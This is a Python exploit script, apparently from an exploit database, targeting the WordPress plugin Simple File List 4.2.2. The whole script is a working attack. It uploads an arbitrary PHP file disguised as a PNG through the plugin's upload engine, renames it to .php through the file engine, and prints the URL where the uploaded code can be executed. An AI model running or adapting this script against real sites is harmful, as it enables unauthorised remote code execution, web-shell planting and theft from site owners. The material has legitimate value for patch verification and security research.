#!/usr/bin/python
# Exploit Title: Wordpress Plugin Simple File List 4.2.2 - Arbitrary File Upload
# Date: 2020-11-01
# Exploit Author: H4rk3nz0
# Original Exploit: https://www.exploit-db.com/exploits/48349
# Software Link: https://wordpress.org/plugins/simple-file-list/
# Version: Tested on Wordpress v5.4 + Simple File List v4.2.2

import requests
import random
import hashlib
import sys
import os
import urllib3

urllib3.disable_warnings()
dir_path = "/wp-content/uploads/simple-file-list/"
upload_path = "/wp-content/plugins/simple-file-list/ee-upload-engine.php"
move_path = "/wp-content/plugins/simple-file-list/ee-file-engine.php"
http = "http://"

def usage():
    print("Usage: python simple-file-list-upload.py <target-ip-address> <php-file>")

def fileWrite():
    filePng = file.split(".")[0]+'.png'
    with open(file) as f:
        with open(filePng, 'w') as f1:
            for line in f:
                f1.write(line)
    print ('[+] Copied to file: ' + filePng)
    return filePng


def upload(ip, filePng):
    files = {'file': (filePng, open(filePng, 'rb'), 'image/png')}
    datas = {'eeSFL_ID': 1,'eeSFL_FileUploadDir': dir_path,'eeSFL_Timestamp': 1587258885,'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2',}
    r = requests.post(http + ip + upload_path, data=datas, files=files, verify=False)
    r = requests.get(http + ip + dir_path + filePng, verify=False)
    if r.status_code == 200:
        print ('[+] File uploaded at ' + http + ip + dir_path + filePng)
        os.remove(filePng)
    else:
        print ('[-] Failed to upload ' + filePng)
        exit(-1)


def move(ip, filePng):
    filePhp = filePng.split(".")[0]+'.php'
    headers = {'Referer': http + ip + '/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1', 'X-Requested-With': 'XMLHttpRequest'}
    datas = {'eeSFL_ID': 1,'eeFileOld': filePng,'eeListFolder': '/','eeFileAction': 'Rename|'+ filePhp,}
    r = requests.post(http + ip + move_path, data=datas, headers=headers, verify=False)
    if r.status_code == 200:
        print ('[+] File moved to ' + http + ip + dir_path + filePhp)
    else:
        print ('[-] Failed to move ' + filePng)
        exit(-1)
    return filePhp


def main(ip):
    pngFile = fileWrite()
    upload(ip, pngFile)
    filePhp = move(ip, pngFile)
    if filePhp:
        print ('[+] Exploit seems to have worked...')
        print ('\tURL: ' + http + ip + dir_path + filePhp)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        usage()
        exit()
    else:
        ip = sys.argv[1]
        file = sys.argv[2]
        main(ip)
